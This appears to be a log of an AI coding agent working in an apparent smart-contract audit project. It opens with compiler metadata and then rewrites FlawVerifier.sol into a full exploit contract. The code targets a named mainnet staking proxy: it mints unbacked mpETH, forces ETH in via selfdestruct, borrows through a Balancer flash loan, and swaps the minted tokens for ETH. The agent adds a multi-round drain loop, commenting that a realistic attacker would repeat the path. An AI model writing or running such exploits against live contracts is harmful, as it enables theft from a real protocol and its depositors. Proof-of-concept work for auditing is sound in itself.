:-;25522:28;25518:1;25510:6;25506:14;25499:52;25382:176;:::o;25564:366::-;25706:3;25727:67;25791:2;25786:3;25727:67;:::i;:::-;25720:74;;25803:93;25892:3;25803:93;:::i;:::-;25921:2;25916:3;25912:12;25905:19;;25564:366;;;:::o;25936:419::-;26102:4;26140:2;26129:9;26125:18;26117:26;;26189:9;26183:4;26179:20;26175:1;26164:9;26160:17;26153:47;26217:131;26343:4;26217:131;:::i;:::-;26209:139;;25936:419;;;:::o;26361:176::-;26501:28;26497:1;26489:6;26485:14;26478:52;26361:176;:::o;26543:366::-;26685:3;26706:67;26770:2;26765:3;26706:67;:::i;:::-;26699:74;;26782:93;26871:3;26782:93;:::i;:::-;26900:2;26895:3;26891:12;26884:19;;26543:366;;;:::o;26915:419::-;27081:4;27119:2;27108:9;27104:18;27096:26;;27168:9;27162:4;27158:20;27154:1;27143:9;27139:17;27132:47;27196:131;27322:4;27196:131;:::i;:::-;27188:139;;26915:419;;;:::o;27340:104::-;27385:7;27414:24;27432:5;27414:24;:::i;:::-;27403:35;;27340:104;;;:::o;27450:138::-;27531:32;27557:5;27531:32;:::i;:::-;27524:5;27521:43;27511:71;;27578:1;27575;27568:12;27511:71;27450:138;:::o;27594:159::-;27659:5;27690:6;27684:13;27675:22;;27706:41;27741:5;27706:41;:::i;:::-;27594:159;;;;:::o;27759:143::-;27816:5;27847:6;27841:13;27832:22;;27863:33;27890:5;27863:33;:::i;:::-;27759:143;;;;:::o;27908:523::-;27995:6;28003;28052:2;28040:9;28031:7;28027:23;28023:32;28020:119;;;28058:79;;:::i;:::-;28020:119;28178:1;28203:72;28267:7;28258:6;28247:9;28243:22;28203:72;:::i;:::-;28193:82;;28149:136;28324:2;28350:64;28406:7;28397:6;28386:9;28382:22;28350:64;:::i;:::-;28340:74;;28295:129;27908:523;;;;;:::o;28437:191::-;28477:3;28496:20;28514:1;28496:20;:::i;:::-;28491:25;;28530:20;28548:1;28530:20;:::i;:::-;28525:25;;28573:1;28570;28566:9;28559:16;;28594:3;28591:1;28588:10;28585:36;;;28601:18;;:::i;:::-;28585:36;28437:191;;;;:::o;28634:223::-;28774:34;28770:1;28762:6;28758:14;28751:58;28843:6;28838:2;28830:6;28826:15;28819:31;28634:223;:::o;28863:366::-;29005:3;29026:67;29090:2;29085:3;29026:67;:::i;:::-;29019:74;;29102:93;29191:3;29102:93;:::i;:::-;29220:2;29215:3;29211:12;29204:19;;28863:366;;;:::o;29235:419::-;29401:4;29439:2;29428:9;29424:18;29416:26;;29488:9;29482:4;29478:20;29474:1;29463:9;29459:17;29452:47;29516:131;29642:4;29516:131;:::i;:::-;29508:139;;29235:419;;;:::o;29660:147::-;29761:11;29798:3;29783:18;;29660:147;;;;:::o;29813:386::-;29917:3;29945:38;29977:5;29945:38;:::i;:::-;29999:88;30080:6;30075:3;29999:88;:::i;:::-;29992:95;;30096:65;30154:6;30149:3;30142:4;30135:5;30131:16;30096:65;:::i;:::-;30186:6;30181:3;30177:16;30170:23;;29921:278;29813:386;;;;:::o;30205:271::-;30335:3;30357:93;30446:3;30437:6;30357:93;:::i;:::-;30350:100;;30467:3;30460:10;;30205:271;;;;:::o;30482:351::-;30552:6;30601:2;30589:9;30580:7;30576:23;30572:32;30569:119;;;30607:79;;:::i;:::-;30569:119;30727:1;30752:64;30808:7;30799:6;30788:9;30784:22;30752:64;:::i;:::-;30742:74;;30698:128;30482:351;;;;:::o;30839:169::-;30979:21;30975:1;30967:6;30963:14;30956:45;30839:169;:::o;31014:366::-;31156:3;31177:67;31241:2;31236:3;31177:67;:::i;:::-;31170:74;;31253:93;31342:3;31253:93;:::i;:::-;31371:2;31366:3;31362:12;31355:19;;31014:366;;;:::o;31386:419::-;31552:4;31590:2;31579:9;31575:18;31567:26;;31639:9;31633:4;31629:20;31625:1;31614:9;31610:17;31603:47;31667:131;31793:4;31667:131;:::i;:::-;31659:139;;31386:419;;;:::o;31811:142::-;31914:32;31940:5;31914:32;:::i;:::-;31909:3;31902:45;31811:142;;:::o;31959:254::-;32068:4;32106:2;32095:9;32091:18;32083:26;;32119:87;32203:1;32192:9;32188:17;32179:6;32119:87;:::i;:::-;31959:254;;;;:::o;32219:332::-;32340:4;32378:2;32367:9;32363:18;32355:26;;32391:71;32459:1;32448:9;32444:17;32435:6;32391:71;:::i;:::-;32472:72;32540:2;32529:9;32525:18;32516:6;32472:72;:::i;:::-;32219:332;;;;;:::o;32557:179::-;32697:31;32693:1;32685:6;32681:14;32674:55;32557:179;:::o;32742:366::-;32884:3;32905:67;32969:2;32964:3;32905:67;:::i;:::-;32898:74;;32981:93;33070:3;32981:93;:::i;:::-;33099:2;33094:3;33090:12;33083:19;;32742:366;;;:::o;33114:419::-;33280:4;33318:2;33307:9;33303:18;33295:26;;33367:9;33361:4;33357:20;33353:1;33342:9;33338:17;33331:47;33395:131;33521:4;33395:131;:::i;:::-;33387:139;;33114:419;;;:::o;33539:231::-;33679:34;33675:1;33667:6;33663:14;33656:58;33748:14;33743:2;33735:6;33731:15;33724:39;33539:231;:::o;33776:366::-;33918:3;33939:67;34003:2;33998:3;33939:67;:::i;:::-;33932:74;;34015:93;34104:3;34015:93;:::i;:::-;34133:2;34128:3;34124:12;34117:19;;33776:366;;;:::o;34148:419::-;34314:4;34352:2;34341:9;34337:18;34329:26;;34401:9;34395:4;34391:20;34387:1;34376:9;34372:17;34365:47;34429:131;34555:4;34429:131;:::i;:::-;34421:139;;34148:419;;;:::o;34573:233::-;34713:34;34709:1;34701:6;34697:14;34690:58;34782:16;34777:2;34769:6;34765:15;34758:41;34573:233;:::o;34812:366::-;34954:3;34975:67;35039:2;35034:3;34975:67;:::i;:::-;34968:74;;35051:93;35140:3;35051:93;:::i;:::-;35169:2;35164:3;35160:12;35153:19;;34812:366;;;:::o;35184:419::-;35350:4;35388:2;35377:9;35373:18;35365:26;;35437:9;35431:4;35427:20;35423:1;35412:9;35408:17;35401:47;35465:131;35591:4;35465:131;:::i;:::-;35457:139;;35184:419;;;:::o;35609:85::-;35654:7;35683:5;35672:16;;35609:85;;;:::o;35700:158::-;35758:9;35791:61;35809:42;35818:32;35844:5;35818:32;:::i;:::-;35809:42;:::i;:::-;35791:61;:::i;:::-;35778:74;;35700:158;;;:::o;35864:147::-;35959:45;35998:5;35959:45;:::i;:::-;35954:3;35947:58;35864:147;;:::o;36017:348::-;36146:4;36184:2;36173:9;36169:18;36161:26;;36197:71;36265:1;36254:9;36250:17;36241:6;36197:71;:::i;:::-;36278:80;36354:2;36343:9;36339:18;36330:6;36278:80;:::i;:::-;36017:348;;;;;:::o;36371:172::-;36511:24;36507:1;36499:6;36495:14;36488:48;36371:172;:::o;36549:366::-;36691:3;36712:67;36776:2;36771:3;36712:67;:::i;:::-;36705:74;;36788:93;36877:3;36788:93;:::i;:::-;36906:2;36901:3;36897:12;36890:19;;36549:366;;;:::o;36921:419::-;37087:4;37125:2;37114:9;37110:18;37102:26;;37174:9;37168:4;37164:20;37160:1;37149:9;37145:17;37138:47;37202:131;37328:4;37202:131;:::i;:::-;37194:139;;36921:419;;;:::o;37346:170::-;37486:22;37482:1;37474:6;37470:14;37463:46;37346:170;:::o;37522:366::-;37664:3;37685:67;37749:2;37744:3;37685:67;:::i;:::-;37678:74;;37761:93;37850:3;37761:93;:::i;:::-;37879:2;37874:3;37870:12;37863:19;;37522:366;;;:::o;37894:419::-;38060:4;38098:2;38087:9;38083:18;38075:26;;38147:9;38141:4;38137:20;38133:1;38122:9;38118:17;38111:47;38175:131;38301:4;38175:131;:::i;:::-;38167:139;;37894:419;;;:::o;38319:90::-;38353:7;38396:5;38389:13;38382:21;38371:32;;38319:90;;;:::o;38415:116::-;38485:21;38500:5;38485:21;:::i;:::-;38478:5;38475:32;38465:60;;38521:1;38518;38511:12;38465:60;38415:116;:::o;38537:137::-;38591:5;38622:6;38616:13;38607:22;;38638:30;38662:5;38638:30;:::i;:::-;38537:137;;;;:::o;38680:345::-;38747:6;38796:2;38784:9;38775:7;38771:23;38767:32;38764:119;;;38802:79;;:::i;:::-;38764:119;38922:1;38947:61;39000:7;38991:6;38980:9;38976:22;38947:61;:::i;:::-;38937:71;;38893:125;38680:345;;;;:::o;39031:165::-;39171:17;39167:1;39159:6;39155:14;39148:41;39031:165;:::o;39202:366::-;39344:3;39365:67;39429:2;39424:3;39365:67;:::i;:::-;39358:74;;39441:93;39530:3;39441:93;:::i;:::-;39559:2;39554:3;39550:12;39543:19;;39202:366;;;:::o;39574:419::-;39740:4;39778:2;39767:9;39763:18;39755:26;;39827:9;39821:4;39817:20;39813:1;39802:9;39798:17;39791:47;39855:131;39981:4;39855:131;:::i;:::-;39847:139;;39574:419;;;:::o;39999:235::-;40139:34;40135:1;40127:6;40123:14;40116:58;40208:18;40203:2;40195:6;40191:15;40184:43;39999:235;:::o;40240:366::-;40382:3;40403:67;40467:2;40462:3;40403:67;:::i;:::-;40396:74;;40479:93;40568:3;40479:93;:::i;:::-;40597:2;40592:3;40588:12;40581:19;;40240:366;;;:::o;40612:419::-;40778:4;40816:2;40805:9;40801:18;40793:26;;40865:9;40859:4;40855:20;40851:1;40840:9;40836:17;40829:47;40893:131;41019:4;40893:131;:::i;:::-;40885:139;;40612:419;;;:::o;41037:164::-;41177:16;41173:1;41165:6;41161:14;41154:40;41037:164;:::o;41207:366::-;41349:3;41370:67;41434:2;41429:3;41370:67;:::i;:::-;41363:74;;41446:93;41535:3;41446:93;:::i;:::-;41564:2;41559:3;41555:12;41548:19;;41207:366;;;:::o;41579:419::-;41745:4;41783:2;41772:9;41768:18;41760:26;;41832:9;41826:4;41822:20;41818:1;41807:9;41803:17;41796:47;41860:131;41986:4;41860:131;:::i;:::-;41852:139;;41579:419;;;:::o;42004:507::-;42083:6;42091;42140:2;42128:9;42119:7;42115:23;42111:32;42108:119;;;42146:79;;:::i;:::-;42108:119;42266:1;42291:64;42347:7;42338:6;42327:9;42323:22;42291:64;:::i;:::-;42281:74;;42237:128;42404:2;42430:64;42486:7;42477:6;42466:9;42462:22;42430:64;:::i;:::-;42420:74;;42375:129;42004:507;;;;;:::o","linkReferences":{}},"methodIdentifiers":{"attemptCandidate(address,uint256)":"1f876380","executeOnOpportunity()":"3c2448ed","profitAmount()":"5ff972cc","profitToken()":"49343624","receiveFlashLoan(address[],uint256[],uint256[],bytes)":"f04f2707"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidPool\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"desiredShares\",\"type\":\"uint256\"}],\"name\":\"attemptCandidate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"executeOnOpportunity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20Like[]\",\"name\":\"tokens\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"feeAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"bytes\",\"name\":\"userData\",\"type\":\"bytes\"}],\"name\":\"receiveFlashLoan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"FlawVerifier\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15\",\"dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[{"internalType":"address","name":"liquidPool","type":"address"},{"internalType":"uint256","name":"desiredShares","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"attemptCandidate"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"executeOnOpportunity"},{"inputs":[],"stateMutability":"view","type":"function","name":"profitAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[{"internalType":"contract IERC20Like[]","name":"tokens","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"uint256[]","name":"feeAmounts","type":"uint256[]"},{"internalType":"bytes","name":"userData","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"receiveFlashLoan"},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"FlawVerifier"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27","urls":["bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15","dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs"],"license":"UNLICENSED"}},"version":1},"id":0}
+codex
+I found the threshold issue; next I’m reading the test harness.
+exec
+/bin/bash -lc "sed -n '1,240p' ../test/ExploitPOC.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src exited 1 in 52ms:
+sed: ../test/ExploitPOC.t.sol: No such file or directory
+exec
+/bin/bash -lc "pwd && rg --files .. | rg 'ExploitPOC\\.t\\.sol|test/|foundry\\.toml'" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src exited 1 in 51ms:
+/Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src
+exec
+/bin/bash -lc "find .. -maxdepth 3 -type f | sed -n '1,200p'" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 50ms:
+../manifest.json
+../src/cache/solidity-files-cache.json
+../src/FlawVerifier.sol
+codex
+I’ve pinned the issue to under-harvesting; now patching the drain loop.
+exec
+/bin/bash -lc "sed -n '1,260p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 51ms:
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IStakingLike is IERC20Like {
+    function mint(uint256 shares, address receiver) external returns (uint256 assets);
+    function liquidUnstakePool() external view returns (address);
+    function previewMint(uint256 shares) external view returns (uint256 assets);
+}
+
+exec
+/bin/bash -lc "sed -n '261,520p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 51ms:
+        }
+    }
+
+    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
+        try ILiquidUnstakePoolLike(liquidPool).getAmountOut(amountIn) returns (uint256 quotedOut, uint256) {
+            return (true, quotedOut);
+        } catch {
+            return (false, 0);
+        }
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
+        (bool ok, bytes memory data) = token.staticcall(
+            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
+        );
+        if (ok && data.length >= 32) {
+            balance = abi.decode(data, (uint256));
+        }
+    }
+
+codex
+I’ve got the fix direction; now applying a tighter sizing strategy and drain loop.
+file update
+A /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IStakingLike is IERC20Like {
+    function mint(uint256 shares, address receiver) external returns (uint256 assets);
+    function liquidUnstakePool() external view returns (address);
+    function previewMint(uint256 shares) external view returns (uint256 assets);
+}
+
+interface ILiquidUnstakePoolLike {
+    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut, uint256 feeAmount);
+    function swapmpETHforETH(uint256 amount, uint256 minOut) external returns (uint256 amountOut);
+}
+
+interface IFlashLoanRecipient {
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external;
+}
+
+interface IBalancerVault {
+    function flashLoan(
+        IFlashLoanRecipient recipient,
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+contract ForceEther {
+    constructor() payable {}
+
+    function boom(address payable target) external {
+        selfdestruct(target);
+    }
+}
+
+contract FlawVerifier is IFlashLoanRecipient {
+    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
+    uint256 internal constant MIN_SHARES = 0.01 ether;
+    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+    uint256 internal constant MIN_REQUIRED_PROFIT = 1;
+    uint256 internal constant MAX_ROUNDS = 8;
+
+    address internal realizedProfitToken;
+    uint256 internal realizedProfitAmount;
+
+    constructor() payable {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        uint256 nativeBefore = address(this).balance;
+
+        // exploit_paths[1]: read `liquidUnstakePool()` from `TARGET_PROXY`.
+        address liquidPool = IStakingLike(TARGET_PROXY).liquidUnstakePool();
+        require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+        require(liquidPool.balance != 0, "liquid pool has no ETH");
+
+        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
+        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
+        // same mint->approve->swap path and size each round against current pool inventory.
+        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
+            if (liquidPool.balance < MIN_SHARES) {
+                break;
+            }
+
+            uint256 roundStart = address(this).balance;
+            uint256 bestAmount = _findBestMintAmount(liquidPool);
+            if (bestAmount < MIN_SHARES) {
+                break;
+            }
+
+            bool success = _tryCandidateSeries(liquidPool, bestAmount);
+            if (!success) {
+                break;
+            }
+
+            if (address(this).balance <= roundStart) {
+                break;
+            }
+
+            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                break;
+            }
+        }
+
+        realizedProfitToken = address(0);
+        realizedProfitAmount = address(this).balance - nativeBefore;
+        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "no net ETH profit realized");
+    }
+
+    function attemptCandidate(address liquidPool, uint256 desiredShares) external {
+        require(msg.sender == address(this), "self-call only");
+
+        // First try the exploit exactly as claimed: mint first, without funding assets.
+        try this.attemptWithoutTopUp(liquidPool, desiredShares) {
+            return;
+        } catch {}
+
+        // If the inherited mint path still assumes some ETH is already parked on the target,
+        // use a realistic public funding step as a fallback. The top-up remains causally prior
+        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
+        uint256 shortfall = _fundingShortfallHint(desiredShares);
+        require(shortfall != 0, "candidate failed without top-up");
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+        require(quoteOk && quotedOut > 1, "candidate has no repayable swap quote");
+
+        if (shortfall >= quotedOut) {
+            shortfall = quotedOut - 1;
+        }
+
+        IERC20Like[] memory tokens = new IERC20Like[](1);
+        tokens[0] = IERC20Like(WETH);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = shortfall;
+
+        // exploit_paths[2]: optionally top up `TARGET_PROXY` with forced ETH to satisfy internal
+        // execution assumptions, using only public capital sourced in this transaction.
+        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(liquidPool, desiredShares));
+    }
+
+    function attemptWithoutTopUp(address liquidPool, uint256 desiredShares) external {
+        require(msg.sender == address(this), "self-call only");
+        _executePath(liquidPool, desiredShares, 0, 0);
+    }
+
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external override {
+        require(msg.sender == BALANCER_VAULT, "unauthorized flashloan callback");
+        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected flashloan shape");
+        require(address(tokens[0]) == WETH, "unexpected flashloan token");
+
+        (address liquidPool, uint256 desiredShares) = abi.decode(userData, (address, uint256));
+
+        IWETH(WETH).withdraw(amounts[0]);
+        _executePath(liquidPool, desiredShares, amounts[0], feeAmounts[0]);
+
+        uint256 repayment = amounts[0] + feeAmounts[0];
+        require(address(this).balance >= repayment, "swap proceeds cannot repay flashloan");
+
+        IWETH(WETH).deposit{value: repayment}();
+        _safeTransfer(WETH, BALANCER_VAULT, repayment);
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitAmount;
+    }
+
+    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
+        uint256[8] memory candidates = [
+            seedAmount,
+            (seedAmount * 7) / 8,
+            (seedAmount * 3) / 4,
+            (seedAmount * 2) / 3,
+            seedAmount / 2,
+            seedAmount / 3,
+            seedAmount / 4,
+            MIN_SHARES
+        ];
+
+        uint256 previousCandidate;
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 candidate = candidates[i];
+            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+                continue;
+            }
+
+            previousCandidate = candidate;
+            try this.attemptCandidate(liquidPool, candidate) {
+                return true;
+            } catch {}
+        }
+    }
+
+    function _executePath(
+        address liquidPool,
+        uint256 desiredShares,
+        uint256 temporaryEth,
+        uint256 flashloanFee
+    ) internal {
+        uint256 mpEthBefore = _balanceOf(TARGET_PROXY, address(this));
+        require(liquidPool != address(0), "liquid pool missing");
+
+        if (temporaryEth != 0) {
+            ForceEther helper = new ForceEther{value: temporaryEth}();
+            helper.boom(payable(TARGET_PROXY));
+        }
+
+        // exploit_paths[3]: call `mint(desiredShares, address(this))` without first transferring
+        // backing assets through the ordinary deposit flow.
+        IStakingLike(TARGET_PROXY).mint(desiredShares, address(this));
+
+        uint256 mintedShares = _balanceOf(TARGET_PROXY, address(this)) - mpEthBefore;
+        require(mintedShares != 0, "mint path produced zero mpETH");
+
+        // exploit_paths[4]: approve the freshly minted mpETH to the liquid unstake pool.
+        _safeApprove(TARGET_PROXY, liquidPool, 0);
+        _safeApprove(TARGET_PROXY, liquidPool, mintedShares);
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, mintedShares);
+        require(quoteOk && quotedOut != 0, "getAmountOut(uint256) unavailable after mint");
+        require(quotedOut > flashloanFee, "quote cannot even cover flashloan fee");
+
+        uint256 nativeBeforeSwap = address(this).balance;
+
+        // exploit_paths[5]: call `swapmpETHforETH()` to convert the unbacked mpETH into ETH.
+        uint256 amountOut = ILiquidUnstakePoolLike(liquidPool).swapmpETHforETH(mintedShares, 0);
+
+        uint256 nativeDelta = address(this).balance - nativeBeforeSwap;
+        require(nativeDelta != 0, "swap returned zero ETH");
+        require(amountOut == nativeDelta, "swap return mismatch");
+
+        if (temporaryEth != 0) {
+            require(nativeDelta > temporaryEth + flashloanFee, "top-up branch is not profitable");
+        }
+    }
+
+    function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+        uint256 poolEth = liquidPool.balance;
+        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
+            return 0;
+        }
+
+        uint256[10] memory probes = [
+            poolHeldShares,
+            (poolHeldShares * 7) / 8,
+            (poolHeldShares * 3) / 4,
+            (poolHeldShares * 2) / 3,
+            poolHeldShares / 2,
+            poolHeldShares / 3,
+            poolHeldShares / 4,
+            poolHeldShares / 8,
+            poolHeldShares / 16,
+            MIN_SHARES
+        ];
+
+        uint256 bestEstimatedProfit;
+        uint256 previousProbe;
+
+        for (uint256 i = 0; i < probes.length; ++i) {
+            uint256 probe = probes[i];
+            if (probe < MIN_SHARES || probe == previousProbe) {
+                continue;
+            }
+
+            previousProbe = probe;
+
+            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
+            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
+                continue;
+            }
+
+            uint256 shortfall = _fundingShortfallHint(probe);
+            if (shortfall >= quotedOut) {
+                continue;
+            }
+
+            uint256 estimatedProfit = quotedOut - shortfall;
+            if (estimatedProfit > bestEstimatedProfit) {
+                bestEstimatedProfit = estimatedProfit;
+                bestAmount = probe;
+            }
+        }
+    }
+
+    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
+        if (desiredShares == 0) {
+            return 0;
+        }
+
+        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+            uint256 targetNativeBalance = TARGET_PROXY.balance;
+            if (ethNeeded > targetNativeBalance) {
+                shortfall = ethNeeded - targetNativeBalance;
+            }
+        } catch {
+            shortfall = 0;
+        }
+    }
+
+    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
+        try ILiquidUnstakePoolLike(liquidPool).getAmountOut(amountIn) returns (uint256 quotedOut, uint256) {
+            return (true, quotedOut);
+        } catch {
+            return (false, 0);
+        }
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
+        (bool ok, bytes memory data) = token.staticcall(
+            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
+        );
+        if (ok && data.length >= 32) {
+            balance = abi.decode(data, (uint256));
+        }
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+apply_patch(auto_approved=true) exited 0 in 42ms:
+Success. Updated the following files:
+A FlawVerifier.sol
+D FlawVerifier.sol
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
